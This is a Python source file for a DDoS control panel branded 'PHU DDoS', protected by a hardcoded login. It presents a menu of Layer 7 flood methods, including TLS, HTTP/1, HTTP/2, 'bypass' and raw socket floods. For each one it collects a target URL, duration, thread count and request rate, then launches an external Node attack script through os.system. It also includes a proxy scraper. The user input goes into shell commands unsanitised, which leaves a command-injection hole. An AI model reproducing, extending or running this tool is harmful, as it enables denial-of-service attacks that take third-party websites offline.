#handsome list -->  Yasuo Akatz Neuchi L1NX

import socket
import os
import random
import getpass
import time
from time import sleep
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def layer7():
    clear()
    print(f'''
                \x1b[38;2;255;0;255m╔╦╗╔═╗\x1b[38;2;255;0;255m╔╦╗╦ ╦\x1b[38;2;189;66;255m╔═╗╔╦╗╔═╗
                \x1b[38;2;255;0;255m║║║║╣  \x1b[38;2;255;0;255m║ ╠═╣\x1b[38;2;189;66;255m║ ║ ║║╚═╗
                \x1b[38;2;255;0;255m╩ ╩╚═╝ \x1b[38;2;255;0;255m╩ ╩ ╩\x1b[38;2;189;66;255m╚═╝═╩╝╚═╝  
          \x1b[38;2;255;0;255m╚══╦═════════════\x1b[38;2;225;30;255m════════════╦══╝
             \x1b[38;2;255;0;255m║         LAYER 7         ║
            \x1b[38;2;255;0;255m╔╩════════════╦\x1b[38;2;225;30;255m════════════╩╗
            \x1b[38;2;255;0;255m║  METHODS 1  ║  METHODS 2  ║
            \x1b[38;2;255;0;255m╠═════════════╬\x1b[38;2;225;30;255m═════════════╣
            \x1b[38;2;255;0;255m║ PHU-RAW     ║ PHU-BYPASS  ║
            \x1b[38;2;255;0;255m║ PHU-SOCKET  ║ PHU-HTTP1   ║
            \x1b[38;2;255;0;255m║ PHU-TLS     ║ PHU-HTTP2   ║
            \x1b[38;2;255;0;255m║ YASUO-POGI  ║ </empty>    ║
            \x1b[38;2;255;0;255m╚═════════════╩\x1b[38;2;225;30;255m═════════════╝
''')
    
def developers():
    clear()
    print(f'''
    \x1b[38;2;255;0;255m╔════════════════════\x1b[38;2;189;66;255m═════════════╗
    \x1b[38;2;255;0;255m║ \x1b[38;2;219;36;255mDEVELOPER: Yasuo-Phu            ║
    \x1b[38;2;255;0;255m║ \x1b[38;2;165;90;255mCOMPILED SCRIPTS: Yasuo & Phu   ║        
    \x1b[38;2;255;0;255m╚════════════════════\x1b[38;2;189;66;255m═════════════╝
''')

def menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
                        \x1b[38;2;255;0;255m╔═╗\x1b[38;2;255;0;255m╦ ╦\x1b[38;2;255;0;255m╦ ╦ \x1b[38;2;225;30;255m╔╦╗\x1b[38;2;225;30;255m╔╦╗\x1b[38;2;225;30;255m╔═╗\x1b[38;2;225;30;255m╔═╗
                        \x1b[38;2;255;0;255m╠═╝\x1b[38;2;255;0;255m╠═╣\x1b[38;2;255;0;255m║ ║  \x1b[38;2;225;30;255m║║\x1b[38;2;225;30;255m ║║\x1b[38;2;225;30;255m║ ║\x1b[38;2;225;30;255m╚═╗
                        \x1b[38;2;255;0;255m╩  \x1b[38;2;255;0;255m╩ ╩\x1b[38;2;255;0;255m╚═╝ \x1b[38;2;225;30;255m═╩╝\x1b[38;2;225;30;255m═╩╝\x1b[38;2;225;30;255m╚═╝\x1b[38;2;225;30;255m╚═╝
               \x1b[38;2;147;108;255m╚═══╦═════════════════════════════╦═══╝
                   \x1b[38;2;147;108;255m║PHILIPPINE HACKING UNIVERSITY║
            \x1b[38;2;147;108;255m╔══════╩═════════════════════════════╩══════╗
            \x1b[38;2;147;108;255m║      Welcome to PHU DDoS by YASUO-PHU     ║
            \x1b[38;2;147;108;255m║        Full Methods Layer 7 Bypasser      ║
            \x1b[38;2;255;0;255m╚════╦════════════════════════════════╦═════╝
                \x1b[38;2;255;0;255m╔╩════════════════════════════════╩╗
                \x1b[38;2;255;0;255m║ Type [help] To See All Commands !║
                \x1b[38;2;255;0;255m╚╦════════════════════════════════╦╝
            \x1b[38;2;255;0;255m╔════╩════════════════════════════════╩════╗
            \x1b[38;2;255;0;255m║         Full Power By Yasuo-PHU          ║
            \x1b[38;2;255;0;255m╚══════════════════════════════════════════╝          
""")
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;255;0;0mroot\x1b[38;2;255;0;0m@p\x1b[38;2;255;0;0mh\x1b[38;2;255;0;0mu~# \x1b[38;2;255;0;0m''')        
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "DEVELOPER" or cnc == "DEV" or cnc == "Dev" or cnc == "DEVELOP" or cnc == "dev":
            developers()
        
        #METHOD LAYER7
        elif "PHU-RAW" in cnc:
            try:
                url = input("root@phu: Target ~ ")
                time = input("root@phu: Time ~ ") 
                threads = input("root@phu: Threads ~ ")
                rps = input("root@phu: Rps ~ ")  
                print(f"""
                      
       \x1b[38;2;225;30;255m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
       \x1b[38;2;225;30;255m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║     
       \x1b[38;2;225;30;255m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝     
     \x1b[38;2;147;108;255m╚╦════════════════════════════════╦╝     
      \x1b[38;2;147;108;255m║ PHILIPPINES HACKING UNIVERSITY ║      
\x1b[38;2;147;108;255m╔═════╩════════════════════════════════╩═════╗
  \x1b[38;2;225;30;255mTARGET   : [{url}]
  \x1b[38;2;225;30;255mDURATION : [{time}]
  \x1b[38;2;225;30;255mTHREADS  : [{threads}]
  \x1b[38;2;225;30;255mRPS      : [{rps}]
  \x1b[38;2;219;36;255mMETHOD   : [PHU-RAW]
\x1b[38;2;225;30;255m╚════════════════════════════════════════════╝
""")
                os.system(f"node methods/phu-raw.js {url} {time} {threads} {rps} ")
            except IndexError:
                print('wrong input')

        elif "PHU-SOCKET" in cnc:
            try:
                url = input("root@phu: Target ~ ")
                time = input("root@phu: Time ~ ") 
                threads = input("root@phu: Threads ~ ")
                rate = input("root@phu: Rps ~ ")  
                print(f"""
                      
       \x1b[38;2;225;30;255m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
       \x1b[38;2;225;30;255m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║     
       \x1b[38;2;225;30;255m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝     
     \x1b[38;2;147;108;255m╚╦════════════════════════════════╦╝     
      \x1b[38;2;147;108;255m║ PHILIPPINES HACKING UNIVERSITY ║      
\x1b[38;2;147;108;255m╔═════╩════════════════════════════════╩═════╗
  \x1b[38;2;225;30;255mTARGET   : [{url}]
  \x1b[38;2;225;30;255mDURATION : [{time}]
  \x1b[38;2;225;30;255mTHREADS  : [{threads}]
  \x1b[38;2;225;30;255mRPS      : [{rate}]
  \x1b[38;2;219;36;255mMETHOD   : [PHU-SOCKET]
\x1b[38;2;225;30;255m╚════════════════════════════════════════════╝
""")
                os.system(f"node methods/phu-socket.js {url} {time} {threads} {rate} ")
            except IndexError:
                print('wrong input')
                
        elif "PHU-BYPASS" in cnc:
            try:
                url = input("root@phu: Target ~ ")
                time = input("root@phu: Time ~ ")
                threads = input("root@phu: Threads ~ ")
                rate = input("root@phu: Rate ~ ")   
                print(f"""
                      
       \x1b[38;2;225;30;255m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
       \x1b[38;2;225;30;255m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║     
       \x1b[38;2;225;30;255m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝     
     \x1b[38;2;147;108;255m╚╦════════════════════════════════╦╝     
      \x1b[38;2;147;108;255m║ PHILIPPINES HACKING UNIVERSITY ║      
\x1b[38;2;147;108;255m╔═════╩════════════════════════════════╩═════╗
  \x1b[38;2;225;30;255mTARGET   : [{url}]
  \x1b[38;2;225;30;255mDURATION : [{time}]
  \x1b[38;2;225;30;255mTHREADS  : [{threads}]
  \x1b[38;2;225;30;255mRPS      : [{rate}]
  \x1b[38;2;219;36;255mMETHOD   : [PHU-BYPASS]
\x1b[38;2;225;30;255m╚════════════════════════════════════════════╝
""")
                os.system(f"node methods/phu-bypass.js {url} {time} {threads} {rate} ")
            except IndexError:
                print('wrong input')
                
        elif "PHU-TLS" in cnc:
            try:
                print(f"")
                url = input("root@phu: Target ~ ")
                time = input("root@phu: Time ~ ")
                threads = input("root@phu: Threads ~ ")
                rate = input("root@phu: Rate ~ ")    
                print(f"""
                      
       \x1b[38;2;225;30;255m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
       \x1b[38;2;225;30;255m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║     
       \x1b[38;2;225;30;255m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝     
     \x1b[38;2;147;108;255m╚╦════════════════════════════════╦╝     
      \x1b[38;2;147;108;255m║ PHILIPPINES HACKING UNIVERSITY ║      
\x1b[38;2;147;108;255m╔═════╩════════════════════════════════╩═════╗
  \x1b[38;2;225;30;255mTARGET   : [{url}]
  \x1b[38;2;225;30;255mDURATION : [{time}]
  \x1b[38;2;225;30;255mTHREADS  : [{threads}]
  \x1b[38;2;225;30;255mRPS      : [{rate}]
  \x1b[38;2;219;36;255mMETHOD   : [PHU-TLS]
\x1b[38;2;225;30;255m╚════════════════════════════════════════════╝
""")
                os.system(f"node methods/phu-tls.js {url} {time} {threads} {rate} ")
            except IndexError:
                print('wrong input')
                 

        elif "PHU-HTTP1" in cnc:
            try:
                url = input("root@phu: Target ~ ")
                time = input("root@phu: Time ~ ")
                threads = input("root@phu: Threads ~ ")
                rate = input("root@phu: Rate ~ ")    
                print(f"""
                      
       \x1b[38;2;225;30;255m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
       \x1b[38;2;225;30;255m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║     
       \x1b[38;2;225;30;255m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝     
     \x1b[38;2;147;108;255m╚╦════════════════════════════════╦╝     
      \x1b[38;2;147;108;255m║ PHILIPPINES HACKING UNIVERSITY ║      
\x1b[38;2;147;108;255m╔═════╩════════════════════════════════╩═════╗
  \x1b[38;2;225;30;255mTARGET   : [{url}]
  \x1b[38;2;225;30;255mDURATION : [{time}]
  \x1b[38;2;225;30;255mTHREADS  : [{threads}]
  \x1b[38;2;225;30;255mRPS      : [{rate}]
  \x1b[38;2;219;36;255mMETHOD   : [PHU-HTTP1]
\x1b[38;2;225;30;255m╚════════════════════════════════════════════╝
""")
                os.system(f"node methods/phu-http1.js GET {url} {time} {threads} {rate} ")
            except IndexError:
                print('wrong input')

        elif "PHU-HTTP2" in cnc:
            try:
                url = input("root@phu: Target ~ ")
                time = input("root@phu: Time ~ ")
                threads = input("root@phu: Threads ~ ")
                rate = input("root@phu: Rate ~ ")    
                print(f"""
                      
       \x1b[38;2;225;30;255m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
       \x1b[38;2;225;30;255m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║     
       \x1b[38;2;225;30;255m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝     
     \x1b[38;2;147;108;255m╚╦════════════════════════════════╦╝     
      \x1b[38;2;147;108;255m║ PHILIPPINES HACKING UNIVERSITY ║      
\x1b[38;2;147;108;255m╔═════╩════════════════════════════════╩═════╗
  \x1b[38;2;225;30;255mTARGET   : [{url}]
  \x1b[38;2;225;30;255mDURATION : [{time}]
  \x1b[38;2;225;30;255mTHREADS  : [{threads}]
  \x1b[38;2;225;30;255mRPS      : [{rate}]
  \x1b[38;2;219;36;255mMETHOD   : [PHU-HTTP2]
\x1b[38;2;225;30;255m╚════════════════════════════════════════════╝
""")
                os.system(f"node methods/phu-http2.js {url} {time} {threads} {rate} --tls ")
            except IndexError:
                print('wrong input')

        elif "YASUO-POGI" in cnc:
            try:
                url = input("root@phu: Target ~ ")
                time = input("root@phu: Time ~ ")
                threads = input("root@phu: Threads ~ ")
                rate = input("root@phu: Rate ~ ")    
                print(f"""
                      
       \x1b[38;2;225;30;255m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
       \x1b[38;2;225;30;255m╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║     
       \x1b[38;2;225;30;255m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝     
     \x1b[38;2;147;108;255m╚╦════════════════════════════════╦╝     
      \x1b[38;2;147;108;255m║ PHILIPPINES HACKING UNIVERSITY ║      
\x1b[38;2;147;108;255m╔═════╩════════════════════════════════╩═════╗
  \x1b[38;2;225;30;255mTARGET   : [{url}]
  \x1b[38;2;225;30;255mDURATION : [{time}]
  \x1b[38;2;225;30;255mTHREADS  : [{threads}]
  \x1b[38;2;225;30;255mRPS      : [{rate}]
  \x1b[38;2;219;36;255mMETHOD   : [YASUO-POGI]
\x1b[38;2;225;30;255m╚════════════════════════════════════════════╝
""")
                os.system(f"node methods/yasuo-pogi.js {url} {time} {threads} {rate} ")
            except IndexError:
                print('wrong input')


        elif cnc == "scrape" or cnc == "SCRAPE":
                print(f"downloading proxy please wait.")
                os.system(f'node methods/scrape.js')
                #main()

        elif "help" in cnc:
            clear()
            print(f'''  
                  

                        \x1b[38;2;255;0;255m╦ ╦\x1b[38;2;255;0;255m╔═╗\x1b[38;2;219;36;255m╦  \x1b[38;2;219;36;255m╔═╗
                        \x1b[38;2;255;0;255m╠═╣\x1b[38;2;255;0;255m║╣ \x1b[38;2;219;36;255m║  \x1b[38;2;219;36;255m╠═╝
                        \x1b[38;2;255;0;255m╩ ╩\x1b[38;2;255;0;255m╚═╝\x1b[38;2;219;36;255m╩═╝\x1b[38;2;219;36;255m╩
                  \x1b[38;2;255;0;255m╚═══╦═════════════╦═══╝
             \x1b[38;2;219;36;255m╔════════╩════╦\x1b[38;2;165;90;255m════════╩════════════╗
             \x1b[38;2;219;36;255m║  \x1b[38;2;219;36;255mCOMMANDS   ║  \x1b[38;2;165;90;255mDESCRIPTION        ║
             \x1b[38;2;219;36;255m╠═════════════╬\x1b[38;2;165;90;255m═════════════════════╣
             \x1b[38;2;219;36;255m║ \x1b[38;2;165;90;255mLAYER7      ║ \x1b[38;2;219;36;255mAvailable Methods   ║
             \x1b[38;2;219;36;255m║ \x1b[38;2;219;36;255mDEV         ║ \x1b[38;2;165;90;255mto see who develop  ║
             \x1b[38;2;219;36;255m║ \x1b[38;2;165;90;255mCLEAR       ║ \x1b[38;2;219;36;255mClear the console   ║
             \x1b[38;2;219;36;255m║ \x1b[38;2;165;90;255mSCRAPE      ║ \x1b[38;2;219;36;255mPROXY SCRAPER       ║
             \x1b[38;2;219;36;255m╚═════════════╩\x1b[38;2;165;90;255m═════════════════════╝
                  
            ''')
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass
            
def login():
    user = "2013"
    passwd = "2013"
    username = input(" Username: ")
    password = getpass.getpass(prompt=' Password: ')
    if username != user or password != passwd:
        print("")
        print("Wrong Username or Password ")
        sys.exit(1)
    elif username == user and password == passwd:
        time.sleep(1)
        
        main()

login()
